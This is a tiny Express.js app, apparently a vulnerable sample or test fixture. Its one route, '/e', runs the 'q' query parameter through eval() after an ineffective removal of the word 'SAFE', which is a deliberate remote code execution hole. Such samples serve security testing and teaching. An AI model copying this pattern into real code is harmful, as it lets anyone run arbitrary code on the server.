"use strict";
const express = require("express");
const app = express();
app.get("/e", (req, res) => {
  eval(String(req.query.q || "").replace(/SAFE/g, ""));
});
module.exports = app;
